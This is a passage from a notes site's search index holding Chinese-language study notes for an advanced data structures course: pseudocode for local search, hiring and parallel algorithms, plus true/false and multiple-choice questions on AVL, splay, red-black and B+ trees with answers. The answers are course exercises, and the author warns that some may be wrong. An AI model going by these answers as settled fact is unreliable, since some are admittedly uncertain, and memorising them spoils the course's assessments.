(kT)}, let S = S\u2019;\n            else  break;\n        }\n    }\n    return S;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#hopfield-neural-networks","title":"Hopfield Neural Networks","text":"state flipping<pre><code>ConfigType State_flipping()\n{\n    Start from an arbitrary configuration S;\n    while ( ! IsStable(S) ) {\n        u = GetUnsatisfied(S);\n        su = - su;\n    }\n    return S;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-maximum-cut-problem","title":"The Maximum Cut Problem","text":"<p>\u4e0d\u96be\u53d1\u73b0\u662f\u4e00\u4e2a\u7279\u6b8a\u7684 HNN \u95ee\u9898\u3002</p> <p>May not terminate in polynomial time: stop if the improvement is not big enough:</p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#hiring-problem","title":"Hiring Problem","text":"naive solution<pre><code>int Hiring ( EventType C[ ], int N )\n{   /* candidate 0 is a least-qualified dummy candidate */\n    int Best = 0;\n    int BestQ = the quality of candidate 0;\n    for ( i=1; i&lt;=N; i++ ) {\n        Qi = interview( i ); /* Ci */\n        if ( Qi &gt; BestQ ) {\n            BestQ = Qi;\n            Best = i;\n            hire( i );  /* Ch */\n        }\n    }\n    return Best;\n} // worse case if candidate gets better and better =&gt; O(N(C_i + C_h))\n</code></pre> random hiring<pre><code>int RandomizedHiring ( EventType C[ ], int N )\n{   /* candidate 0 is a least-qualified dummy candidate */\n    int Best = 0;\n    int BestQ = the quality of candidate 0;\n\n    randomly permute the list of candidates;\n\n    for ( i=1; i&lt;=N; i++ ) {\n        Qi = interview( i ); /* Ci */\n        if ( Qi &gt; BestQ ) {\n            BestQ = Qi;\n            Best = i;\n            hire( i );  /* Ch */\n        }\n    }\n} // E = O(N*C_i + ln(N)*C_h)\n</code></pre> hire once<pre><code>int OnlineHiring ( EventType C[ ], int N, int k )\n{\n    int Best = N;\n    int BestQ = - \\infty;\n    for ( i=1; i&lt;=k; i++ ) {\n        Qi = interview( i );\n        if ( Qi &gt; BestQ )   BestQ = Qi;\n    }\n    for ( i=k+1; i&lt;=N; i++ ) {\n        Qi = interview( i );\n        if ( Qi &gt; BestQ ) {\n            Best = i;\n            break;\n        }\n    }\n    return Best;\n}\n</code></pre> <p>\u4f7f\u7528\u79ef\u5206\u5bf9\u6700\u540e\u7684 Pr[S] \u8fdb\u884c\u653e\u7f29\u5f97\u5230\uff1a\\(\\frac kN\\ln\\left(\\frac Nk\\right)\\leq\\Pr[S]\\leq\\frac kN\\ln\\left(\\frac{N-1}{k-1}\\right)\\)</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#parallel-algorithms","title":"Parallel Algorithms","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#the-summation-problem","title":"The summation problem","text":"<p>\u53f3\u4fa7\u7684\u7a7a\u5706\u8868\u793a\u95f2\u7f6e\u7684 processers</p> PRAM module<pre><code>for Pi ,  1 \u2264 i \u2264 n  pardo\n    B(0, i) := A( i )\n    for h = 1 to log n do\n        if i \u2264 n/2^h\n            B(h, i) := B(h-1, 2i-1) + B(h-1, 2i)\n        else stay idle\n    for i = 1: output B(log n, 1); \n    for i &gt; 1: stay idle\n</code></pre> <p></p> <p>\u6ce8\u610f\u662f\u7b2c\u4e09\u6761\u662f\u5c0f\u4e8e\u7b49\u4e8e\uff08\u9519\u8fc7\u4e00\u6b21\uff09\u3002</p> Work-Depth (WD) Presentation<pre><code>for Pi ,  1 \u2264 i \u2264 n  pardo // use time 1\n    B(0, i) := A( i )\nfor h = 1 to log n // use time log(n)\n    for Pi, 1 \u2264 i \u2264 n/2h  pardo\n        B(h, i) := B(h-1, 2i-1) + B(h-1, 2i)\nfor i = 1 pardo // use time 1\n    output  B(log n, 1)\n</code></pre> <ul> <li>T(n) = log(n) + 2</li> <li>W(n) = n + n/2 + n/4 + ... + 1 =&gt; 2n = O(n)</li> <li>\u4efb\u4f55WD\u6a21\u578b\u7684algorithm\uff0c\u7528\u00a0P(n)\u00a0\u4e2a processor\uff0c\u8fd0\u884c\u65f6\u95f4\u90fd\u81f3\u591a\u4e3a\u00a0\\(O\\left( \\frac{W(n)}{P(n)}+T(n) \\right)\\) \uff08\u5904\u7406\u5668\u5145\u8db3\u53ef\u52a0\u901f\uff0c\u4e0d\u5145\u8db3\u4e5f\u80fd\u591f\u8fd0\u884c\uff09</li> </ul> <p>\u3010WD-presentation Sufficiency Theorem\u3011An algorithm in the WD mode can be implemented by any P(n) processors within O(W(n)/P(n) + T(n)) time, using the same concurrent-write convention as in the WD presentation.</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#prefix-sums","title":"Prefix-Sums","text":"Prefix-Sums<pre><code>for Pi , 1 \u2264 i \u2264 n pardo // use time 1\n    B(0, i) := A(i)\nfor h = 1 to log n // use time log(n)\n    for i , 1 \u2264 i \u2264 n/2h pardW()o\n        B(h, i) := B(h - 1, 2i - 1) + B(h - 1, 2i)\nfor h = log n to 0 // use time log(n)\n    for i even, 1 \u2264 i \u2264 n/2h pardo\n        C(h, i) := C(h + 1, i/2)\n    for i = 1 pardo\n        C(h, 1) := B(h, 1)\n    for i odd, 3 \u2264 i \u2264 n/2h pardo\n        C(h, i) := C(h + 1, (i - 1)/2) + B(h, i)\nfor Pi , 1 \u2264 i \u2264 n pardo // use time 1\n    Output C(0, i)\n</code></pre> <ul> <li>T(n) = 2log(n)+2 = O(log(n))</li> <li>W(n) = O(n)</li> </ul>","tags":["notes"]},{"location":"note/other/ADS_PPT/#merging-ranking","title":"Merging =&gt; ranking","text":"<ul> <li>binary search<ul> <li>T(n)=log(n)</li> <li>W(n)=nlog(n)</li> </ul> </li> <li>serial ranking (\u4e8c\u8005\u4e0d\u7b49\u957f)<ul> <li>T(n)=O(n+m)</li> <li>W(n)=O(n+m)</li> </ul> </li> <li>Parallel Ranking<ul> <li>T(n)=O(log(n))</li> <li>W(n)=O(n)</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/other/ADS_PPT/#maximum-finding","title":"Maximum Finding","text":"<ul> <li>summation problem \u4e2d + \u6362\u4e3a max()<ul> <li>T(n)=log(n)</li> <li>W(n)=O(n)</li> </ul> </li> <li>compare all pairs<ul> <li>T(n)=1</li> <li>W(n)=O(n^2)</li> </ul> </li> <li>Doubly-logarithmic Paradigm<ul> <li>T(n)=O(log(log(n)))</li> <li>W(n)=O(n)</li> </ul> </li> <li>Random Sampling<ul> <li>T(n)=O(1)</li> <li>W(n)=O(n)</li> <li>Pr[wrong]= \\(O\\left( \\frac{1}{n^c}\\right)\\) &amp; O(n) processers required.</li> </ul> </li> </ul>","tags":["notes"]},{"location":"note/other/ADS_problems/","title":"ADS problems","text":"<p>\u4e3b\u8981\u662f ADS \u4f5c\u4e1a\u9898&amp;\u8003\u8bd5\u9898\uff0c<code>(multi)</code> \u8868\u793a \u201c\u9898\u76ee\u8868\u793a\u591a\u9009\u201d \u3002</p> <p>\u5224\u65ad/\u9009\u62e9\u9898\u7b54\u6848\u5728\u6bcf\u9898\u5bf9\u5e94\u90e8\u5206\u7684\u6700\u540e\uff0c\u622a\u56fe\u4e2d\u7684\u7b54\u6848\u6709\u6982\u7387\u9519\u8bef\uff1b\u6700\u540e\u7ed9\u7684\u7b54\u6848\u51e0\u7ecf\u5468\u8f6c\u5176\u5b9e\u4e5f\u4e0d\u80fd\u8bf4\u4e00\u5b9a\u6b63\u786e\uff08\u6211\u4f1a\u58f0\u660e\u6216\u5728\u6700\u540e\u7ed9\u51fa\u7684\u7b54\u6848\u524d\u52a0\u4e0a <code>-</code> \u7b26\u53f7\uff1b\u4f8b\u5982 <code>-F</code> \uff09\uff0c\u8bf7\u81ea\u4e3b\u7504\u522b\u3002</p> <p>Jianjun Zhou's Notebook \u4e2d\u51fa\u73b0\u7684\u9898\u76ee\u5927\u6982\u7387\u4e0d\u4f1a\u518d\u51fa\u73b0\u5728\u6b64\u5904\uff08\u9664\u975e\u6211\u5bf9\u9898\u89e3\u6709\u65b0\u7684\u60f3\u6cd5/\u6211\u89c9\u5f97\u8fd9\u9053\u9898\u4e0d\u9519/\u6211\u8fd9\u9053\u9898\u9519\u4e86\uff09\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#avl-tree","title":"AVL Tree","text":"<p>AVL tree \u8282\u70b9\u6570\u4e0e\u6811\u9ad8\u7684\u5173\u7cfb\uff0c\u4e0b\u9762\u4ee5\u7a7a\u6811\u9ad8 0 \u4e3a\u4f8b\u5b50\uff1a</p> <ul> <li>\u6700\u5927\u8282\u70b9\u6570 N(h) \u5f53\u7136\u662f\u6ee1\u4e8c\u53c9\u6811\u60c5\u51b5\u4e0b\u51fa\u73b0\uff0c\u4e3a \\(N(h) = 2^{h}-1\\);</li> <li>\u6700\u5c0f\u8282\u70b9\u6570 n(h) \u6709\u9012\u63a8\u5f0f\uff1a \\(n(h) = n(h-1)+n(h-2)+1\\); n(0)=0, n(1)=1</li> </ul>","tags":["notes"]},{"location":"note/other/ADS_problems/#_1","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>Every subtree of an AVL tree is also an AVL tree.</p> <p>T</p> <p>Question</p> <p>Consider an AVL tree. Immediately after we insert a node (without restoring the tree balance), the parent of the newly inserted node may become imbalanced.</p> <p>\u5047\u8bbe\u4e00\u4e0b the parent of the newly inserted node \uff08\u6ce8\u610f\uff0c\u4e0d\u662f the grandparent of the newly inserted node\uff09\u539f\u6765\u6709 0/1 \u4e2a\u5b50\u8282\u70b9\uff0c\u90fd\u4e0d\u53ef\u80fd imbalanced \u3002</p> <p>F</p> <p>Question</p> <p></p> <p>4 \u662f trouble maker\uff0c1 \u662f trouble finder\u3002</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_2","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>D</p> <p>Question</p> <p>(multi) Suppose that immediately after we delete a node from an AVL tree (without restoring the tree balance), some node u becomes imbalanced. Let T be the subtree rooted at u. How will the height of T change after we rebalance u? (Note that the root of T changes after rebalancing.)</p> <p>A.increases by 1 ;  B.does not change ;  C.decreases by 1 ;  D.(this question does only have three choices)</p> <p>\u7406\u89e3\"Let T be the subtree rooted at u\" \u662f\uff08\u8ba9 T \u662f\u4ee5 u \u4e3a\u6839\u7684\u5b50\u6811\uff0c\u5373 u \u672c\u8eab\u5728 T \u4e2d\u5373\u53ef\uff09\uff1b\u540c\u65f6\u6ce8\u610f\u662f\u5220\u9664\uff0c\u8d77\u521d\u60ef\u6027\u8ba4\u4e3a\u662f\u63d2\u5165\uff0c\u5355\u8d70\u4e00\u4e2a C \u3002</p> <p>BC</p> <p>Question</p> <p>Consider an AVL tree of height 5. Which of the followings are the possible number of nodes in this tree? We assume that the height of a single node is 1.</p> <p>A.10 B.20 C.30 D.35</p> <p>\u89c1\u5f00\u5934\u7684 tip \uff0c\u540e\u9762\u51e0\u9898\u7c7b\u4f3c\u3002</p> <p>BC</p> <p>Question</p> <p>If the depth of an AVL tree is 6 (the depth of an empty tree is defined to be -1), then the minimum possible number of nodes in this tree is:</p> <p>A.13 ; B.17 ; C.20 ; D.33</p> <p>D</p> <p>Question</p> <p>If there are 21 nodes in an AVL tree, then the maximum depth of the tree is __. The depth of an empty tree is defined to be 0.</p> <p>A.6 ; B.4 ; C.7 ; D.5</p> <p>\u6309\u7167\u4e4b\u524d\u7684\u7ed3\u8bba\u53cd\u5411\u63a8\u7406\uff1aAVL \u6811\u8981\u9ad8 x\uff0c\u81f3\u5c11\u8981 y \u4e2a\u8282\u70b9\u3002\u5f53\u7136\uff0c\u8981\u6ce8\u610f\u6811\u6df1\u5ea6\u7684\u5b9a\u4e49\u3002\u8981\u9ad8 6\uff0c\u81f3\u5c11 20 \u4e2a\u8282\u70b9\uff1b\u8981\u9ad8 7\uff0c\u81f3\u5c11 33 \u8282\u70b9\u3002</p> <p>A</p> <p>Question</p> <p>For the result of accessing the keys 3, 9, 1, 5 in order in the splay tree in the following figure, which one of the following statements is FALSE?</p> <p></p> <p>A. 5 is the root ; B. 1 and 9 are siblings ; </p> <p>C. 6 and 10 are siblings ; D. 3 is the parent of 4</p> <p>\u8fd9\u4e2a\u56fe\u771f\u592a\u96be\u753b\u4e86\uff0c\u4e0d\u8fc7\u719f\u7ec3\u7684\u8bdd\u8fd8\u662f\u80fd\u5728\u51e0\u5206\u949f\u5185\u753b\u51fa\u6765\u7684\uff08\u6211\u7684\u5efa\u8bae\u662f\u5728\u67d0\u4e00\u6b21\u53d8\u6362\u4e2d\u6ca1\u6709\u7528\u5230\u7684\u5b50\u6811\u7528\u7279\u6b8a\u5f62\u72b6\u8868\u793a\u8282\u7ea6\u65f6\u95f4\uff09\uff0c\u8fd9\u91cc\u501f Jianjun Zhou's Notebook \u7684\u56fe\uff1a</p> <p>D</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#splay-tree-amortize","title":"Splay Tree &amp; Amortize","text":"<p>\u644a\u8fd8\u5206\u6790\uff08\u52bf\u80fd\u6cd5\uff09</p> <ul> <li>\u5f00\u9500\u5927\u7684\u64cd\u4f5c\u5e94\u5f53\u503e\u5411\u8ba9\u52bf\u80fd\u964d\uff0c\u5f00\u9500\u5c0f\u7684\u64cd\u4f5c\u5e94\u5f53\u503e\u5411\u8ba9\u52bf\u80fd\u5347\uff1b</li> <li>\u52bf\u80fd\u9ad8\u503e\u5411\u4e8e\u8ba9\u67d0\u4e9b\u64cd\u4f5c\u5f00\u9500\u5927\uff0c\u52bf\u80fd\u4f4e\u503e\u5411\u4e8e\u8ba9\u67d0\u4e9b\u64cd\u4f5c\u5f00\u9500\u5c0f\uff1b</li> <li>\u03a6(final) &gt;= \u03a6(initial)\uff1b\u66f4\u4e25\u683c\u5730\u8bf4\uff0c</li> </ul> <p>\u52bf\u80fd\u5e94\u5f53\u662f\u9488\u5bf9\u67d0\u4e00\u6570\u636e\u7ed3\u6784\u7684\u5f62\u6001\u6765\u5b9a\u4e49\u7684\uff1b\u6bcf\u4e00\u6b65\u64cd\u4f5c\u540e\u7684\u52bf\u80fd\u90fd\u5e94\u5f53\u4e0d\u5c0f\u4e8e\u521d\u59cb\u7684\u52bf\u80fd\uff0c\u5373 \\(\\phi(D_{i})\\geq \\phi(D_{0})\\)</p> <p>worst-case bound &gt;= amortized bound &gt;= average-case bound</p> <p>Splay tree deletion</p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_3","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>Let T be a BST. If we perform a splay operation on the node with the minimum key, then the root of the resulting tree has no left child.</p> <p>\u5728 splay tree \u4e2d\uff0c\u6700\u5c0f\u503c\u88ab splay \uff08\u5373\u901a\u8fc7\u65cb\u8f6c\uff0c\u76f4\u5230\u4e3a\u6839\u8282\u70b9\uff09\u65f6\uff0c\u4f5c\u4e3a\u6839\u8282\u70b9\uff0c\u81ea\u7136\u6ca1\u6709\u5de6\u8282\u70b9\u3002</p> <p>T</p> <p>Question</p> <p>Suppose that the insertion operation of some data structure has a worst-case cost of \u0398(n) and an amortized cost of \\(O(\\log n)\\). Starting with the empty structure, if we perform m insertion operations consecutively, the total cost may be as large as \u0398(\\(m^2\\)).</p> <p>amortized cost \u7ed9\u51fa\u4e00\u4e2a\u4fdd\u8bc1\uff1a\u5bf9\u4e8e\u4efb\u610f\u7ec4\u5408\u7684\u4e00\u4e2a\u8fde\u7eed n \u6b21\u64cd\u4f5c\uff0c\u82e5\u5176\u603b\u7528\u65f6\u4e3a T(n)\uff0c\u90a3\u4e48\u7528\u65f6\u4e0a\u9650 \\(amorized cost = \\frac{T(n)}{n}\\) \u3002</p> <p>F</p> <p>Question</p> <p>The height of a splay tree with n nodes can be as large as \u0398(n).</p> <p>\u4f8b\u5982\u8fde\u7eed\u63d2\u5165 123456789 \u5230\u4e00\u4e2a\u7a7a\u6811\u4e2d\u3002</p> <p>T</p> <p>Question</p> <p>Suppose we have a potential function \u03a6 such that for all \u03a6(Di\u200b)\u2265\u03a6(D0\u200b) for all i, but \\(\u03a6(D0)\\neq0\\). Then there exists a potential \u03a6\u2032 such that \u03a6\u2032(D0\u200b)=0, \u03a6\u2032(Di\u200b)\u22650 for all i\u22651, and the amortized costs using \u03a6\u2032 are the same as the amortized costs using \u03a6.</p> <p>T</p> <p>Question</p> <p>amortized bounds are weaker than the corresponding worst-case bounds, because there is no guarantee for any single operation.</p> <p>\\(worst-case \\geq amortized \\geq average-case\\)</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_4","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p></p> <p>D</p> <p>Question</p> <p></p> <p>\u8fde\u7eed\u63d2\u5165\u9012\u589e/\u51cf\u6570\u5217\uff0csplay tree \u4f1a\u6210\u4e00\u6761\u94fe\u8868\u3002</p> <p>D</p> <p>Question</p> <p></p> <p>\u524d\u9762\u4e5f\u63d0\u5230\u4e86\uff0csplay tree \u6700\u574f\u7684\u9ad8\u5ea6\u53ef\u4ee5\u662f h = n\uff0c\u800c findkey(4) \u5728\u7b2c\u4e8c\u6b21\u4e4b\u540e\u4e00\u5b9a\u662f O(1) \u65f6\u95f4\uff0c\u6545\u603b\u5171 O(n+m)</p> <p>B</p> <p>Question</p> <p>(multi) Consider the dynamic array given in class. Which of the following potential functions will yield an amortized cost of O(1) for insertion? Select all the potential functions that work. To be rigorous, you may multiply all the following functions by a constant that is large enough. (Hint: recall that a good potential function must satisfy two certain conditions.)</p> <p></p> <p>\u52a8\u6001\u6570\u7ec4\u662f\u8bf4\uff1a\u8d77\u521d\u6570\u7ec4\u5927\u5c0f\u4e3a 1\uff1b\u5f53\u6570\u7ec4\u88ab\u586b\u6ee1\u540e\uff0c\u5c06\u6570\u7ec4\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u62f7\u8d1d\u5230\u53e6\u4e00\u4e2a\u3001\u5927\u5c0f\u4e3a\u53cc\u500d\u7684\u6570\u7ec4\u4e2d\u3002</p> <p>\u56de\u987e\u52bf\u80fd\u51fd\u6570\u7684\u8981\u6c42\uff08\u4e0a\u9762\u6709\uff09\uff0c\u5f00\u9500\u5927\u7684\u64cd\u4f5c\u81ea\u7136\u662f\u53d1\u751f\u5728\u4e86\u586b\u5145\u6700\u540e\u4e00\u4e2a\u6570\u3001\u6570\u7ec4\u8f6c\u79fb\u7684\u65f6\u5019\u3002</p> <p>\u6545\u9009\u62e9 E \uff08\u9898\u76ee\u8bf4\u7684\u591a\u9009\ud83d\ude07\uff09</p> <p>Question</p> <p></p> <p>\u540c\u6837\u753b\u51fa\u56fe\u6765\u5c31\u597d\uff0c\u521a\u597d\u662f\u4e00\u9897\u5b8c\u7f8e\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u53ef\u4ee5\u7528 Splay Tree Visualzation (usfca.edu) \u6a21\u62df\u3002</p> <p>C</p> <p>Question</p> <p>When doing amortized analysis, which one of the following statements is FALSE?</p> <p>A. Aggregate analysis shows that for all\u00a0n, a sequence of\u00a0n\u00a0operations takes worst-case time\u00a0T(n)\u00a0in total. Then the amortized cost per operation is therefore\u00a0T(n)/n</p> <p>B. For potential method, a good potential function should always assume its maximum at the start of the sequence</p> <p>C. For accounting method, when an operation's amortized cost exceeds its actual cost, we save the difference as credit to pay for later operations whose amortized cost is less than their actual cost</p> <p>D. The difference between aggregate analysis and accounting method is that the later one assumes that the amortized costs of the operations may differ from each other</p> <p>\u52bf\u80fd\u51fd\u6570 \\(\\Phi(x) \\geq \\Phi(initial)\\) \uff0c\u5373\u5728\u5f00\u59cb\u65f6\u5e94\u5f53\u662f\u6700\u5c0f\u7684\uff1b\u5176\u5b83\u662f\u5bf9\u7684\uff0c\u5e73\u65f6\u5173\u6ce8\u8f83\u5c11\uff0c\u7a0d\u52a0\u6ce8\u610f\u3002</p> <p>\u5bf9\u4e8e\u4e09\u79cd\u644a\u8fd8\u5206\u6790\u65b9\u6cd5\u7684\u8fa8\u6790\uff0c\u6211\u6bd4\u8f83\u8ba4\u540c\u65f6\u6e05\u5ddd\u7684\u4e2a\u4eba\u4e3b\u9875 \u7684\u770b\u6cd5\u3002</p> <p>B</p> <p>Question</p> <p></p> <p>\u56e0\u4e3a\u4ece A \u4e2d pop \u548c push B \u64cd\u4f5c\u4e86\u4e24\u904d\uff0c\u6240\u4ee5 \\(\\Phi = 2|S_{A}|\\) \uff08\u6ca1\u6709\u7b54\u6848\u9a8c\u8bc1\uff0c\u4f46\u662f\u77e5\u9053 A \u662f\u9519\u8bef\u7684\uff0c\u5927\u81f4\u53ef\u4ee5\u5224\u65ad\u7b54\u6848\u662f B\uff09\u3002</p> <p>B</p> <p>Question</p> <p> </p> <p></p>","tags":["notes"]},{"location":"note/other/ADS_problems/#rad-black-tree","title":"Rad Black Tree","text":"<p>Properties of RBTree</p> <ol> <li>Every node is either red or black.</li> <li>The root is black.</li> <li>Every leaf (<code>NIL</code>) is black.</li> <li>if a node is red, then both its children are black.</li> <li>For each node, all simple paths from the node to descendant leaves contain the same number of black nodes.</li> </ol> <p>Tip</p> <ul> <li>\u7ea2\u9ed1\u6811\u4e0d\u5b58\u5728\u53ea\u6709\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u7684\u7ea2\u8272\u8282\u70b9\u3002</li> <li>\u4e00\u4e2a\u5ea6\u4e3a 1 \u7684\u8282\u70b9\uff0c\u5b83\u672c\u8eab\u4e00\u5b9a\u662f\u9ed1\u8272\u7684\uff0c\u4e14\u5b83\u552f\u4e00\u7684\u5b69\u5b50\u4e00\u5b9a\u662f\u7ea2\u8272\u7684\u3002</li> <li>\u4e00\u4e2a\u6709 N \u4e2a\u5185\u90e8\u8282\u70b9\uff08\u4e0d\u5305\u62ecNIL\uff09\u7684\u7ea2\u9ed1\u6811\uff0c\u5176\u6700\u5927\u9ad8\u5ea6\u4e3a\u00a0\\(2\\log_{2}(N+1)\\)\u3002</li> <li><code>NIL</code>\u00a0\u8282\u70b9\u88ab\u4e00\u4e2a\u7ea2\u8272\u8282\u70b9\u7f6e\u6362\u5e76\u4e0d\u4f1a\u6539\u53d8\u4e00\u9897\u7ea2\u9ed1\u6811\u7684\u9ed1\u9ad8\u3002</li> <li>\u7ea2\u8272\u8282\u70b9\u4e0d\u80fd\u76f8\u90bb\uff08\u56e0\u4e3a\u7ea2\u8272\u8282\u70b9\u5b50\u8282\u70b9\u53ea\u80fd\u662f\u9ed1\u8272\uff09</li> </ul> <p>\u5173\u4e8e\u7ea2\u9ed1\u6811\uff0c\u53ef\u4ee5\u770b\u770b</p> <ul> <li>\u3010\u6570\u636e\u7ed3\u6784\u3011\u53f2\u4e0a\u6700\u597d\u7406\u89e3\u7684\u7ea2\u9ed1\u6811\u8bb2\u89e3\uff0c\u8ba9\u4f60\u5f7b\u5e95\u641e\u61c2\u7ea2\u9ed1\u6811\uff1b<ul> <li>\u5c06\u7ea2\u9ed1\u6811\u7b49\u4ef7\u4e3a 4 \u9636 B \u6811</li> </ul> </li> <li>\u5bf9\u4e8e\u7ea2\u9ed1\u6811\u7684\u5220\u9664\uff0c\u5982\u679c\u8fd8\u6ca1\u7406\u89e3\u7684\u53ef\u4ee5\u518d\u770b Deletion in RB Tree<ul> <li>\u5f15\u5165 \u201c\u53cc\u9ed1\u8282\u70b9\u201d\u7684\u6982\u5ff5\uff0c\u603b\u7ed3\u5982\u4e0b\uff1a</li> </ul> </li> </ul> <p>\u5148\u89c6\u4e3a\u6b63\u5e38\u7684\u4e8c\u53c9\u6811\u5220\u9664\uff1a\u5982\u679c\u88ab\u5220\u9664\u7684\u70b9\u6709\u4e24\u4e2a\u5b50\u8282\u70b9\uff0c\u5219\u627e\u5230\u76f4\u63a5\uff08\u524d\u9a71/\u540e\u9a71\uff09\uff0c\u66ff\u6362\u540e\uff0c\u518d\u5220\u9664\u76f4\u63a5\uff08\u524d\u9a71/\u540e\u9a71\uff09\u3002\u4e4b\u540e\u7684\u5220\u9664\u5206\u4e3a\u4ee5\u4e0b\u5206\u652f\u60c5\u51b5\uff1a</p> <p></p> <p>\u7ea2\u8272\u865a\u7ebf\u6846\u4e2d\uff0cs \u8868\u793a\u88ab\u5220\u9664\u7684\u9ed1\u8272\u8282\u70b9\u7684\u5144\u5f1f\uff08sibling\uff09\uff0cp \u8868\u793a\u5171\u6709\u7684\u7236\u8282\u70b9\uff08parent\uff09\uff0cr \u8868\u793a s \u7684\u7ea2\u8272\u8282\u70b9\uff0c\u56fe\u793a\u5982\u4e0b\uff1a</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_5","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>The number of nodes, including the external nodes (NIL), in a red black tree must be odd.</p> <p>\u7b97\u4e0a NIL \uff0c\u7ea2\u9ed1\u6811\u4e00\u5b9a\u662f\u6ee1\u4e8c\u53c9\u6811\uff08Full Binary Tree\uff09\uff0c\u8282\u70b9\u6570\u4e00\u5b9a\u4e3a\u5947\u6570\u3002</p> <p>T</p> <p>Question</p> <p>Consider a node u of a Red-black tree in extended version. Let \\(h_{L}\\) \u200b and \\(h_{R}\\) \u200b be the height of the left and right subtrees of u, respectively. (We assume that the height of a single node is 1.) We have \\(\\frac{1}{2}\\leq\\frac{h_{L}}{h_{R}}\\leq2.\\)</p> <p>\u8fd9\u662f\u7ea2\u9ed1\u6811\u6027\u8d28\u7684\u76ee\u7684\uff0c\u4fdd\u6301\u201c\u6811\u201d\u5f62\u6001\u3002</p> <p>T</p> <p>Question</p> <p>Is it true that the DELETE operation in a RED-BLACK tree of n nodes requires \u03a9(logn) rotations in the worst case?</p> <p></p> <p>F</p> <p>Question</p> <p></p> <p>\u5e94\u8be5\u53ea\u6709 13 \u989c\u8272\u53d1\u751f\u4e86\u53d8\u5316\u3002</p> <p>F</p> <p>Question</p> <p></p> <p>Red node can only have two or no internal black note(s).</p> <p>F</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_6","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p>(multi) Let u be an internal node in a red black tree. Suppose that one child of u is an internal node v, and the other is an external node (NIL). Which of the following statements are correct?</p> <p>A.u must be red. B.u must be black.</p> <p>C.v must be red. D.Both children of v are NIL</p> <p>\u7ea2\u9ed1\u6811\u7684\u6027\u8d28</p> <p>BCD</p> <p>Question</p> <p>In the red-black tree that results after successively inserting the keys 41; 38; 31; 12; 19; 8 into an initially empty red-black tree, which one of the following statements is FALSE?</p> <p>A. 38 is the root</p> <p>B. 19 and 41 are siblings, and they are both red</p> <p>C. 12 and 31 are siblings, and they are both black</p> <p>D. 8 is red</p> <p>\u5efa\u8bae\u8fd8\u662f\u624b\u7ed8\u4e00\u904d\uff0c\u5982\u679c\u7ed3\u679c\u4e0d\u5bf9\u770b RB\u00a0\u6811\u6a21\u62df \u627e\u539f\u56e0\uff1b\u4f9d\u65e7\u662f\u501f\u7528 Jianjun Zhou's Notebook \u7684\u56fe\uff1a</p> <p>B</p> <p>Question</p> <p>Two red-black trees are said to be different if they have different tree structures or different node colors. How many different red-black trees are there with 3 internal nodes?</p> <p>A. 1; B. 2; C.3; D. more than 3;</p> <p>2</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#bplus-tree","title":"Bplus Tree","text":"<p>property of B+ Tree</p> <ul> <li>The root is either a leaf or has between\u00a02\u00a0and\u00a0M\u00a0children.</li> <li>All nonleaf nodes (except the root) have between \u2308M/2\u2309\u00a0and M children.</li> <li>All leaves are at the same depth.</li> <li>\u5728\u7a7a\u95f4\u6700\u6d6a\u8d39\u7684\u60c5\u51b5\u4e0b\u662f\u4e00\u68f5\u00a0\u2308M/2\u2309\u00a0\u53c9\u6811\uff0c\u6240\u4ee5 B+ \u6811\u7684\u6df1\u5ea6\u662f\u00a0\\(O(\u2308log_{\u2308M/2\u2309}\u200bN\u2309)\\).</li> </ul> <p></p> <p>\u7531\u4e0a\u56fe\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5185\u90e8\u8282\u70b9\u7684\u503c\u662f \u201c\u53f3\u4fa7\u7684\u6307\u9488\u80fd\u591f\u8bbf\u95ee\u5230\u7684\u6700\u5c0f\u503c\u201d\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_7","title":"\u5224\u65ad\u9898","text":"<p>Question</p> <p>Consider an insertion in a B+ tree. We may need to update some keys stored in some internal nodes even if no leaf is split during the insertion.</p> <p>\u60f3\u8981\u66f4\u65b0 internal nodes \u7684\u503c &lt;- \u53f6\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u503c\u6539\u53d8 &lt;- \u65b0\u63d2\u5165\u503c\u63d2\u5165\u53f6\u8282\u70b9\u7b2c\u4e00\u4e2a\u503c\uff08\u4e0d\u53ef\u80fd\uff0c\u5982\u679c\u63d2\u5165\u503c\u5c0f\u4e8e\u67d0\u4e2a\u53f6\u8282\u70b9\u7b2c\u4e00\u4e2a\u503c\uff0c\u5c31\u4f1a\u63d2\u5165\u5230\u524d\u4e00\u4e2a\u53f6\u8282\u70b9\u4e2d\uff09\u6216\u8005\u53f6\u8282\u70b9\u5206\u88c2\uff08\u4e0d\u5408\u9898\u610f\uff09\uff0c\u6545\u4e0d\u53ef\u80fd\u3002</p> <p>F</p> <p>Question</p> <p>A B+ tree of order 3 is also called a 2-3 tree. Consider a 2-3 tree with 3 internal nodes. Its leaves can have a maximum number of 18 keys in total.</p> <p>T</p>","tags":["notes"]},{"location":"note/other/ADS_problems/#_8","title":"\u9009\u62e9\u9898","text":"<p>Question</p> <p>For a B+ tree with order M and N keys, the time complexity of find operations is \\(O(\\log_MN)\\)</p> <p>\u8282\u70b9\u5185\u90e8\u8fd8\u5f97\u641c\u4e00\u904d\u5462\u3002</p> <p>F</p> <p>Question</p> 